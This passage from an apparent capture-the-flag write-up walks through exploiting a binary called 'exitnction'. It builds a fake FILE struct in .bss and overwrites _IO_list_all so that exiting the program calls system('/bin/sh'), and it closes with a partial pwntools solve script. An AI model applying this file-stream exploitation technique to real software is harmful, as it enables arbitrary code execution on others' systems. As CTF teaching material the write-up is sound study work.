<p>I decided to do 8-byte writes and not 64-bytes just for the sake of simplifying so you guys can easily understand!</p>
<p>Now, before we start building the exploit let me remind you there is a limit on the writes that you can do which is set to 3. So, we’ll have to overwrite it after three writes so, it doesn’t exit. I tried overwriting it with a very large negative number to get a lot of writes but, that didn’t work maybe cause the check is against a unsigned decimal? But, I figured out that if you overwrote it to <code>-1</code>, the program after the write and before the check will add one to it making it zero.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:62ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6"># Place this line after ever three writes!</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> exe.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;sent_mails&#39;</span><span style="--0:#24292E;--1:#E1E4E8">], p64(</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#AE4B07;--1:#FFAB70">sign</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">True</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="# Place this line after ever three writes!write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))"><div></div></button></div></figure></div>
<p>Now, let’s get started with placing the file struct in the <code>.bss</code> section. As you can see from the above memory inspection the area is zero’ed by default so, we only need to write the non-zero values.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:68ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">.ljust(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">18</span><span style="--0:#24292E;--1:#E1E4E8">, p64(libc.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&quot;system&quot;</span><span style="--0:#24292E;--1:#E1E4E8">]))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">88</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">205700</span><span style="--0:#24292E;--1:#E1E4E8">)[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">:])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> exe.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;sent_mails&#39;</span><span style="--0:#24292E;--1:#E1E4E8">], p64(</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#AE4B07;--1:#FFAB70">sign</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">True</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="write(pieBase + 0x4210, b&#34;/bin/sh\x00&#34;.ljust(0x8, b&#34;\x00&#34;))write(pieBase + 0x4210 + 0x18, p64(libc.symbols[&#34;system&#34;]))write(pieBase + 0x4210 + 0x88 + 1, p64(libc.address + 0x205700)[1:])write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))"><div></div></button></div></figure></div>
<p>You might be confused why I’m truncating the LSB of the <code>_lock</code> value. That’s cause it’s zero by default and sending <code>0x00</code> stops <code>fgets</code> reading!</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:84ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">a0</span><span style="--0:#24292E;--1:#E1E4E8">, p64(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">20</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">c0</span><span style="--0:#24292E;--1:#E1E4E8">, p64(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">d8</span><span style="--0:#24292E;--1:#E1E4E8">, p64((libc.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;_IO_wfile_jumps&#39;</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">48</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">18</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> exe.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;sent_mails&#39;</span><span style="--0:#24292E;--1:#E1E4E8">], p64(</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#AE4B07;--1:#FFAB70">sign</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">True</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="write(pieBase + 0x4210 + 0xa0, p64(pieBase + 0x4210 - 0x20))write(pieBase + 0x4210 + 0xc0, p64(pieBase + 0x4210))write(pieBase + 0x4210 + 0xd8, p64((libc.symbols['_IO_wfile_jumps'] + 0x48) - 0x18))write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))"><div></div></button></div></figure></div>
<p>So, <code>pieBase+0x4210</code> is the file pointer that is the start of the fake file struct and the rest of the writes we have already covered in detail!</p>
<p>After we have placed the fake file struct in the <code>.bss</code> section we have to overwrite the <code>_IO_lis_all</code> to that address so, <code>_IO_flush_all</code> triggers the vtable of our fake file!</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:58ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(libc.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;_IO_list_all&#39;</span><span style="--0:#24292E;--1:#E1E4E8">], p64(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="write(libc.symbols['_IO_list_all'], p64(pieBase + 0x4210))"><div></div></button></div></figure></div>
<p>Now, that we have everything setup we just have to exit the program:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:32ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&gt; &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;exit&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.interactive()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="io.sendlineafter(b&#34;> &#34;, b&#34;exit&#34;)io.interactive()"><div></div></button></div></figure></div>
<h3 id="field-goal-nah--full-touchdown">Field Goal? Nah — Full Touchdown</h3>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:87ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#616972;--1:#99A0A6">#!/usr/bin/env python3</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">from</span><span style="--0:#24292E;--1:#E1E4E8"> pwn </span><span style="--0:#BF3441;--1:#F97583">import</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">exe </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> context.binary </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(args.</span><span style="--0:#005CC5;--1:#79B8FF">EXE</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">or</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;./exitnction&#39;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> ELF(exe.libc.path)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">def</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">start</span><span style="--0:#24292E;--1:#E1E4E8">(argv</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8">[], </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">a, </span><span style="--0:#BF3441;--1:#F97583">**</span><span style="--0:#24292E;--1:#E1E4E8">kw):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> args.</span><span style="--0:#005CC5;--1:#79B8FF">GDB</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> gdb.debug([exe.path] </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> argv, </span><span style="--0:#AE4B07;--1:#FFAB70">gdbscript</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8">gdbscript, </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">a, </span><span style="--0:#BF3441;--1:#F97583">**</span><span style="--0:#24292E;--1:#E1E4E8">kw)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">else</span><span style="--0:#24292E;--1:#E1E4E8">:</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> process([exe.path] </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> argv, </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">a, </span><span style="--0:#BF3441;--1:#F97583">**</span><span style="--0:#24292E;--1:#E1E4E8">kw)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">def</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">write</span><span style="--0:#24292E;--1:#E1E4E8">(addr, data):</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&gt; &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;write&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;: 0x&quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#005CC5;--1:#79B8FF">hex</span><span style="--0:#24292E;--1:#E1E4E8">(addr).encode())</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;(8 chars): &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, data)</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;(64 chars): &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">gdbscript </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;&#39;&#39;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">b exit</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#032F62;--1:#9ECBFF">&#39;&#39;&#39;</span><span style="--0:#24292E;--1:#E1E4E8">.format(</span><span style="--0:#BF3441;--1:#F97583">**</span><span style="--0:#005CC5;--1:#79B8FF">locals</span><span style="--0:#24292E;--1:#E1E4E8">())</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> start()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.sendlineafter(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;&gt; &quot;</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;server&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.recvuntil(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;0x&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">pieBase </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">int</span><span style="--0:#24292E;--1:#E1E4E8">(io.recvline().strip().decode()[:</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> exe.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;current_license&#39;</span><span style="--0:#24292E;--1:#E1E4E8">]</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">io.recvuntil(</span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;0x&quot;</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">libc.address </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">int</span><span style="--0:#24292E;--1:#E1E4E8">(io.recvline().strip().decode()[:</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#005CC5;--1:#79B8FF">16</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#24292E;--1:#E1E4E8"> libc.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;exit&#39;</span><span style="--0:#24292E;--1:#E1E4E8">]</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;/bin/sh</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">.ljust(</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">8</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#BF3441;--1:#F97583">b</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#005CC5;--1:#79B8FF">\x00</span><span style="--0:#032F62;--1:#9ECBFF">&quot;</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">18</span><span style="--0:#24292E;--1:#E1E4E8">, p64(libc.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&quot;system&quot;</span><span style="--0:#24292E;--1:#E1E4E8">]))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">4210</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">88</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, p64(libc.address </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">205700</span><span style="--0:#24292E;--1:#E1E4E8">)[</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">:])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">35</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">write(pieBase </span><span style="--0:#BF3441;--1:#F97583">+</span><span style="--0:#24292E;--1:#E1E4E8"> exe.symbols[</span><span style="--0:#032F62;--1:#9ECBFF">&#39;sent_mails&#39;</span><span style="--0:#24292E;--1:#E1E4E8">], p64(</span><span style="--0:#BF3441;--1:#F97583">-</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#AE4B07;--1:#FFAB70">sign</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">True</span><span style="--0:#24292E;--1:#E1E4E8">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">36</div></div><div class="code">
